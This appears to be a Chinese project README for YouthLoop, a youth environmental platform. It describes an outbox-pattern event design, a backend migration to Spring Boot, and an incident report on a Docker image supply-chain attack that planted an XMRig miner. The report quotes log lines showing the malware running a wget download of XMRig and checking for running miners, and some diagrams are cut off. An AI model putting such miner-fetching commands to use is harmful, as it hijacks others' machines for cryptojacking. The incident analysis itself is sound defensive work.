## 一、项目简介

YouthLoop 是一个面向青年群体的**环保教育互动平台**，融合社交内容、环保活动、碳排放主题卡牌游戏、积分激励体系等功能模块，通过游戏化机制与社区互动提升用户的环保参与度。

```
平台核心功能：

  [游戏] 碳排放卡牌策略游戏    →  技术树 / 排行榜 / 存档 / 教程
  [活动] 环保活动管理系统      →  发布 / 报名 / 签到 / 统计
  [科普] 环保科学知识平台      →  文章 / 搜索 / 智能推荐 / AI 爬取
  [积分] 积分激励体系          →  获取 / 兑换 / 排行 / 历史记录
  [社交] 用户互动系统          →  点赞 / 评论 / 收藏 / 站内通知
  [管理] 运营管理后台          →  内容审核 / 轮播配置 / 游戏配置
```

## 十一、异步事件处理架构 (Outbox Pattern)

> 基于 Outbox Pattern 实现事务性事件发布，Worker 轮询消费，保证业务数据与事件的强一致性：

```
  同步处理 (阻塞式):                  异步处理 (Outbox Pattern):

  用户请求                            用户请求
    │                                  │
    ▼                                  ▼
  写入业务数据                         ┌─ BEGIN 事务 ──────────────┐
    │                                  │  写入业务数据              │
    ▼                                  │  写入事件到 outbox_event 表│
  发送通知    ← 阻塞等待              └─ COMMIT ─────────────────┘
    │                                  │
    ▼                                  ▼
  结算积分    ← 阻塞等待              立即返回响应 (非阻塞)
    │
    ▼                                  --- 异步链路 (Worker 轮询) ---
  返回响应 (高延迟)
                                    outbox_event 表 → Worker 每 5 秒轮询
                                       │
                                       ├── 更新互动计数 (赞/评论/收藏)
                                       ├── 推送站内通知
                                       └── 积分结算
```

**Outbox 事件表结构与状态流转：**

```
  outbox_event 表 (social schema)
  ┌──────────┬──────────┬──────────┬──────────┬──────────┐
  │ id (UUID)│eventType │ payload  │  status  │retryCount│
  │          │          │ (JSONB)  │          │          │
  └──────────┴──────────┴──────────┴──────────┴──────────┘

  状态流转:

  ┌─────────┐     Worker 取出     ┌────────────┐    处理成功    ┌────────┐
  │ pending │ ──────────────────► │ processing │ ────────────► │  done  │
  │  (1)    │                     │    (2)     │               │  (3)   │
  └─────────┘                     └─────┬──────┘               └────────┘
                                        │
                                        │ 处理失败 (retryCount < 5)
                                        │ 指数退避: 1min → 2min → 4min → 8min → 16min
                                        ▼
                                  ┌─────────┐
                                  │ pending │  重新排队等待重试
                                  │  (1)    │
                                  └─────────┘
                                        │
                                        │ 重试 5 次仍失败
                                        ▼
                                  ┌─────────┐
                                  │  dead   │  进入死信状态，需人工排查
                                  │  (4)    │
                                  └─────────┘
```

**已注册的事件类型与处理器：**

```
┌────────────────────┬──────────────────────────────────────────┐
│ 事件类型            │ 处理逻辑                                  │
├────────────────────┼──────────────────────────────────────────┤
│ COMMENT_CREATED    │ 更新目标(文章/活动)评论计数                 │
│                    │ 如果是回复 → 通知父评论作者                 │
├────────────────────┼──────────────────────────────────────────┤
│ COMMENT_DELETED    │ 减少目标评论计数                           │
├────────────────────┼──────────────────────────────────────────┤
│ REACTION_CHANGED   │ 根据类型(赞/收藏/踩)和动作(创建/删除)       │
│                    │ 更新对应计数器                              │
├────────────────────┼──────────────────────────────────────────┤
│ SIGNUP_CREATED     │ 通知活动主办方有新报名                      │
├────────────────────┼──────────────────────────────────────────┤
│ SIGNUP_AUDITED     │ 通知报名用户审核结果(通过/拒绝)              │
├────────────────────┼──────────────────────────────────────────┤
│ CONTENT_CREATED    │ 内容创建事件 (预留扩展)                     │
│ CONTENT_UPDATED    │ 内容更新事件 (预留扩展)                     │
│ ACTIVITY_CREATED   │ 活动创建事件 (预留扩展)                     │
│ POINTS_EARNED      │ 积分变动事件 (预留扩展)                     │
└────────────────────┴──────────────────────────────────────────┘
```

**核心设计约束 — 事务一致性保障：**

```
  业务代码中发布事件:

  @Transactional
  public void likeArticle(Long userId, Long contentId) {
      reactionMapper.insert(reaction);                    // 写入业务数据
      outboxEventService.publishEvent(                    // 写入事件
          "REACTION_CHANGED", payload                     // (同一事务)
      );
  }  // COMMIT → 业务数据和事件要么同时成功，要么同时回滚

  publishEvent() 使用 @Transactional(propagation = MANDATORY)
  强制要求在现有事务中调用，否则抛异常 → 从设计层面杜绝事件丢失
```

**数据采集整体流程：**

```

  │                   每日自动采集流程                              │
  │                                                              │
  │  定时触发 (Cron 可配置)                                       │
  │      │                                                       │
  │      ▼                                                       │
  │  ┌──────────┐     ┌──────────┐     ┌──────────┐             │
  │  │ 1.爬取    │────►│ 2.AI清洗  │────►│ 3.入库    │             │
  │  │ (JSoup)  │     │(DeepSeek)│     │(MyBatis) │             │
  │  └──────────┘     └──────────┘     └──────────┘             │
  │       │                │                │                    │
  │       ▼                ▼                ▼                    │

**Outbox 事件消费的完整处理流程：**

```
  OutboxEventConsumer (每 5 秒执行)
      │
      ├─ SELECT * FROM outbox_event
      │  WHERE status = 1 (pending)
      │  AND (nextRetryAt IS NULL OR nextRetryAt <= now())
      │  ORDER BY created_at ASC
      │  LIMIT 10
      │
      ├─ 遍历每条事件:
      │     │
      │     ├─ markProcessing(id) → status = 2
      │     │
      │     ├─ 根据 eventType 查找 Handler
      │     │     │
      │     │     ├── COMMENT_CREATED ──► CommentCreatedHandler
      │     │     │   ├─ 解析 payload (commentId, targetType, targetId, userId)
      │     │     │   ├─ targetType=1 → contentStatsService.incrementCommentCount()
      │     │     │   ├─ targetType=2 → activityStatsService.incrementCommentCount()
      │     │     │   └─ 如果 parentId != null → notificationService.create()
      │     │     │       通知父评论作者: "有人回复了你的评论"
      │     │     │
      │     │     ├── REACTION_CHANGED ──► ReactionChangedHandler
      │     │     │   ├─ 解析 payload (reactionType, targetType, action)
      │     │     │   ├─ reactionType=1(赞) + action=1(创建) → incrementLikeCount()
      │     │     │   ├─ reactionType=1(赞) + action=2(删除) → decrementLikeCount()
      │     │     │   ├─ reactionType=2(收藏) → incrementFavCount/decrementFavCount
      │     │     │   └─ reactionType=3(踩)  → incrementDownCount/decrementDownCount
      │     │     │
      │     │     ├── SIGNUP_CREATED ──► SignupEventHandler
      │     │     │   └─ 通知主办方: "有新用户报名您的活动"
      │     │     │
      │     │     └── SIGNUP_AUDITED ──► SignupEventHandler
      │     │         ├─ 通过 → 通知用户: "您的报名已通过"
      │     │         └─ 拒绝 → 通知用户: "您的报名未通过"
      │     │
      │     ├─ 成功 → markDone(id) → status = 3
      │     └─ 失败 → retryCount < 5 → markFailed() + 指数退避
      │              retryCount >= 5 → markDead() → status = 4
      │
      └─ 等待 5 秒 → 下一轮轮询
```

## 十五、开发过程中的技术挑战

### 15.1 后端技术选型：从 Fastify (Node.js) 到 Java Spring Boot

项目初期（2025年9月），团队采用纯 Next.js 全栈方案进行开发，前后端均使用 TypeScript，后端计划采用 Fastify 框架（Node.js 生态高性能 Web 框架）。

随着业务复杂度增长，在 2026 年 1 月进行了后端技术栈的整体迁移：

```
  2025.09                 2025.11                2026.01
     │                       │                      │
     ▼                       ▼                      ▼
  初始方案                 技术升级                 架构迁移
  Next.js 全栈            升级前端依赖             引入 Java 后端
  (纯前端 MVP)            (仍为纯前端)            (Spring Boot 微服务)

  原计划后端方案:                    最终后端方案:
  ┌──────────────────┐              ┌──────────────────┐
  │  Fastify (Node)  │    ──►      │  Spring Boot 3.4 │
  │  TypeScript      │              │  Java 21         │
  │  Prisma ORM      │              │  MyBatis         │
  └──────────────────┘              └──────────────────┘
```

**迁移原因：**

```
┌────┬──────────────────┬─────────────────────────────────────────┐
│ #  │ 决策因素          │ 分析                                    │
├────┼──────────────────┼─────────────────────────────────────────┤
│ 1  │ 业务复杂度        │ 16 个业务模块涉及权限、事件、队列等，     │
│    │                  │ Node.js 单线程模型难以应对复杂并发场景     │
├────┼──────────────────┼─────────────────────────────────────────┤
│ 2  │ 生态成熟度        │ Spring Security / RabbitMQ / Flyway 等   │
│    │                  │ 企业级组件在 Java 生态中更成熟稳定         │
├────┼──────────────────┼─────────────────────────────────────────┤
│ 3  │ 类型安全与工程化   │ Java 强类型系统 + Maven 多模块管理在大型  │
│    │                  │ 项目中提供更强的编译期保障                 │
├────┼──────────────────┼─────────────────────────────────────────┤
│ 4  │ 多服务拆分需求     │ 社交/游戏/Worker 三服务独立部署，Spring   │
│    │                  │ Boot 的 Starter 机制使模块复用更便捷      │
├────┼──────────────────┼─────────────────────────────────────────┤
│ 5  │ 运维可观测性       │ Spring Actuator 提供开箱即用的健康检查、  │
│    │                  │ 指标暴露，JVM 监控工具链成熟               │
└────┴──────────────────┴─────────────────────────────────────────┘
```

最终形成 **Next.js (前端) + Spring Boot (后端)** 的前后端分离架构，前端保留 TypeScript 生态的开发效率优势，后端获得 Java 生态的工程化与稳定性保障。

### 15.2 生产环境安全事件：Docker 镜像供应链攻击 (XMRig 挖矿木马)

2026 年 2 月底，服务首次部署至阿里云 ECS 后不久，发现前端 Docker 镜像 `ghcr.io/simo-szu/environment_protect-web:v2` 被植入 XMRig 挖矿木马，属于 Docker 镜像供应链攻击。

**事件时间线：**

```
  2026-02-25            2026-02 末                    2026-03-02
      │                     │                              │
      ▼                     ▼                              ▼
  首次部署上线          发现服务异常                     应急响应
  服务正常运行         CPU 占用稳定在 ~80%              销毁受感染实例
                       登录页面崩溃                     重建服务器并重新部署
```

**故障现象与定位过程：**

```
  ┌──────────────────────────────────────────────────────────┐
  │  异常表现                                                 │
  │                                                          │
  │  · 服务器 CPU 占用率持续维持在约 80%                       │
  │  · 首页等静态页面可以正常打开，但响应明显变慢                │
  │  · 跳转到登录/注册页面时，页面直接崩溃无法加载               │
  └────────────────────────┬─────────────────────────────────┘
                           │
                           ▼
  ┌──────────────────────────────────────────────────────────┐
  │  原因分析                                                 │
  │                                                          │
  │  挖矿进程占用约 80% CPU，剩余 ~20% 勉强支撑静态页面渲染    │
  │  登录/注册页面需要额外加载 Google OAuth SDK 组件，           │
  │  该组件初始化时的 CPU 峰值 + 挖矿进程的 80% 底噪           │
  │  = 总占用突破 100%，触发 Next.js uncaughtException 崩溃    │
  └────────────────────────┬─────────────────────────────────┘
                           │
                           ▼
  ┌──────────────────────────────────────────────────────────┐
  │  日志证据                                                 │
  │                                                          │
  │  Command failed: wget -q                                 │
  │    https://github.com/xmrig/xmrig/releases/download/v6.  │
  │  Command failed: ps aux | grep xmrig | grep -v grep      │
  │  digest: 'VULN_639290'                                   │
  │  digest: 'VULN_487188'                                   │
  │                                                          │
  │  日志明确显示镜像中的恶意代码尝试下载 XMRig 挖矿程序，       │
  │  并通过 ps aux 检测是否已有挖矿进程在运行                   │
  └──────────────────────────────────────────────────────────┘
```

**攻击链路：**

```
  Docker 镜像供应链攻击
      │
      │  前端 Docker 镜像 ghcr.io/simo-szu/environment_protect-web:v2
      │  被注入恶意代码 (通过依赖链污染)
      ▼
  恶意代码在容器启动时执行
      │
      │  1. wget 下载 XMRig v6.x (Monero 挖矿程序)
      │  2. ps aux | grep xmrig 检测是否已有矿机运行
      │  3. 启动 XMRig 占用 ~80% CPU 挖取 Monero (XMR)
      ▼
  业务影响
      │
      │  · 挖矿进程故意控制在 ~80% CPU (低于 100% 以延缓被发现)
      │  · 静态页面勉强可用 (剩余 ~20% CPU)
      │  · 登录/注册页加载 Google OAuth SDK 时 CPU 叠加溢出
      │  · 恶意代码抛出 uncaughtException 导致 Next.js 进程崩溃
      ▼
  前端服务不可用
```

**应急响应流程：**

```
  ┌──────────────────────────────────────────────────────────┐
  │                     应急响应流程                           │
  │                                                          │
